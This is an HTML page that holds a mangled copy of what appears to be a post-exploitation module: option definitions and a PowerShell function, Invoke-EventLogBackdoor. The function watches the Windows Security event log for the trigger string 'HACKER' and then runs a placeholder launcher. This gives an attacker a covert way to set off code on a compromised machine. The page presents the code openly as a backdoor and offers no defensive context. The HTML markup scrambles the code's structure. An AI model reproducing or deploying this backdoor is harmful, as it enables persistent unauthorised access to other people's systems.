<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>EventLog RDP</title>
</head><body>Starts the event-loop backdoor<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'Trigger' : {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'Description' &nbsp; : &nbsp; 'The unique value to look for in every event packet.',<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'Required' &nbsp; &nbsp; &nbsp;: &nbsp; True,<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp;'Value' : 'HACKER'</li>
</ul>
</li>
</ul>
OutFile' : {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'Description' &nbsp; : &nbsp; 'Output the backdoor to a file instead of tasking to an agent.',<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'Required' &nbsp; &nbsp; &nbsp;: &nbsp; False,<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp;'Value' &#09;&#09;: ''</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">function Invoke-EventLogBackdoor</li>
<li style="list-style-type: none">{</li>
<li style="list-style-type: none">&nbsp; &nbsp; Param(</li>
<li style="list-style-type: none">&nbsp; &nbsp; [Parameter(Mandatory=$False,Position=1)] &nbsp; &nbsp;</li>
<li style="list-style-type: none">&nbsp; &nbsp; [string]$Trigger="HACKER", </li>
<li style="list-style-type: none">&nbsp; &nbsp; [Parameter(Mandatory=$False,Position=2)]</li>
<li style="list-style-type: none">&nbsp; &nbsp; [int]$Timeout=0,</li>
<li style="list-style-type: none">&nbsp; &nbsp; [Parameter(Mandatory=$False,Position=3)]</li>
<li style="list-style-type: none">&nbsp; &nbsp; [int]$Sleep=30</li>
<li style="list-style-type: none">&nbsp; &nbsp; )</li>
<li style="list-style-type: none">&nbsp; &nbsp; $running=$True</li>
<li style="list-style-type: none">&nbsp; &nbsp; $match =""</li>
<li style="list-style-type: none">&nbsp; &nbsp; $starttime = Get-Date</li>
<li style="list-style-type: none">&nbsp; &nbsp; while($running)</li>
<li style="list-style-type: none">&nbsp; &nbsp; {</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; {</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $running=$False</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; }</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; $d = Get-Date</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; $NewEvents = Get-WinEvent -FilterHashtable @{logname='Security'; StartTime=$d.AddSeconds(-$Sleep)} -ErrorAction SilentlyContinue | fl Message | Out-String</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; </li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; if($NewEvents -match $Trigger)</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; {</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; REPLACE_LAUNCHER</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $running=$False</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; }</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; else</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; {</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Start-Sleep -s $Sleep</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; }</li>
<li style="list-style-type: none">&nbsp; &nbsp; }</li>
<li style="list-style-type: none">}</li>
<li style="list-style-type: none">Invoke-EventLogBackdoor"""</li>
</ul>
</li>
</ul>
</body></html>